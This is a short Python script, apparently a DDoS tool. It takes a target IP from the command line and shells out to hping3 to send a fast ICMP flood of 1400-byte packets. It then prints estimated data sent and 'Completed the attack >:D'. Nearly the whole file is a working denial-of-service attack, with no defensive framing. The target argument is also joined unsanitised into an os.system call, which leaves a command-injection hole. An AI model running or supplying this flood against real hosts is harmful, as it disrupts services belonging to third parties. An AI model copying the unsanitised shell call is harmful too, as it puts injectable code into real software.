import os, sys, time, datetime

# Global parameters
ERROR_BAD_ARGV_FROM_USER = '[DDoS] Error, incorrect arguments: '
INFO_INIT_1 = '[DDoS] Starting the attack on the given IP '
INFO_INIT_2 = '(Press CTRL+C to stop me)...'
INFO_STATS = '[DDoS] Quitting, showing stats:'
ATTACK_FIN = '[DDoS] Completed the attack  >:D'
PKTS_CADENCE = 100
PKTS_LEN = 1442
DATA_LEN = 1000000
DATA_STR = 'MB'
INIT_WAIT = 4


# Get the current time 
def get_str_time():
	return ('[' + (datetime.datetime.now()).strftime('%H:%M:%S') + ']')

# Get the time difference based on global variables
def diff():
	return (datetime.datetime.now() - time_init)

# Prepare the stats
def stats():
	return ('[+] Time Elapsed: ' + str(diff()) + '\n' + '[+] Data sent: ' 
		+ str(diff().total_seconds() * PKTS_CADENCE * PKTS_LEN / DATA_LEN) + ' ' + DATA_STR + '\n')

if __name__ == "__main__":
	# Check the passed arguments
	if len(sys.argv) != 2:
		print(get_str_time() + ERROR_BAD_ARGV_FROM_USER + '\n\n\t Usage: python3 ' + sys.argv[0] + ' <Destination IP>')
		exit(-1)
	
	# Initialize status variables
	time_init = datetime.datetime.now()
	
	# Tell the user how he/she can stop the attack
	print(INFO_INIT_1 + sys.argv[1] + ' ' + INFO_INIT_2)
	os.system('sleep ' + str(INIT_WAIT))

	# Run hping3!
	os.system('hping3 -V -1 -d 1400 --faster ' + sys.argv[1])	

	# Show the stats
	print('\n\n'+get_str_time() + INFO_STATS + '\n\n' + stats())
	print(get_str_time() + ATTACK_FIN)
